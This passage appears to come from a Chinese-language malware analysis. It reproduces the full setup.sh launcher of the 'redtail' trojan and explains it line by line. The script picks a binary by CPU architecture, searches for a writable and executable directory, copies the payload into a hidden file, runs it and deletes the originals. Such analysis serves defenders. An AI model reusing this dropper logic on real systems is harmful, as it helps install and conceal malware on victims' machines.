再来看看这个木马病毒的启动脚本：**`setup.sh`**

```
#!/bin/bash

NOARCH=false;
ARCH="";
FOLDER="";

if [ -f "/bin/uname" ] && [ -f "/bin/grep" ]; then
	ARCH=$(uname -mp);
	if echo "$ARCH" | grep -q "x86_64" ; then
		ARCH="x86_64";
	elif echo "$ARCH" | grep -q "i686"; then
		ARCH="i686";
	elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then
		ARCH="arm8";
	elif echo "$ARCH" | grep -q "armv7"; then
		ARCH="arm7";
	else
		NOARCH=true;
	fi
else
	NOARCH=true;
fi

#sysctl -w vm.nr_hugepages=$(nproc)

#for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
#do
#    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
#done

FOLDER=$(find / -writable -executable -readable -not -path "/proc/*" | head -n 1 || echo /tmp);
CURR=${PWD}

if [ "$CURR" != "$FOLDER" ]; then
	mv redtail.* $FOLDER
	cd $FOLDER
fi

if [ "$NOARCH" = true ]; then
	cat redtail.x86_64 > .redtail; chmod +x .redtail; ./.redtail;
	cat redtail.i686 > .redtail; chmod +x .redtail; ./.redtail;
	cat redtail.arm8 > .redtail; chmod +x .redtail; ./.redtail;
	cat redtail.arm7 > .redtail; chmod +x .redtail; ./.redtail;
else
	cat "redtail.$ARCH" > .redtail; chmod +x .redtail; ./.redtail;
fi

rm -rf redtail.*
```

木马病毒启动脚本**`setup.sh`**主要作用是根据系统架构（x86\_64、i686、armv8、aarch64、armv7），来执行相应的可执行文件，脚本具体分析如下：

1. `NOARCH=false; ARCH=""; FOLDER="";`定义了三个变量，分别用于存储架构信息、系统文件夹路径信息以及是否检测到系统架构的标志。
2. 使用 `uname -mp` 命令获取系统架构信息，并且使用 `grep` 来检测不同的系统架构类型。
3. 接下来是一系列的 `if-elif-else` 语句，根据系统的不同架构类型设置 `ARCH` 变量。
4. 如果系统缺少 `/bin/uname` 或者 `/bin/grep` 文件，则将 `NOARCH` 设置为 true。
5. `FOLDER=$(find / -writable -executable -readable -not -path "/proc/*" | head -n 1 || echo /tmp);`: 使用 `find` 命令查找一个可读、可写、可执行的文件夹来存储 redtail 文件。
6. 获取当前目录的路径，并检查当前目录路径是否与找到的文件夹路径相同，如果不同，则将 redtail 文件移动到找到的文件夹路径下，并切换到该文件夹。
7. 根据 `NOARCH` 变量的值，执行不同架构的 redtail 文件，或者根据系统架构的不同执行对应架构的 redtail 文件。
8. 删除 redtail 文件。
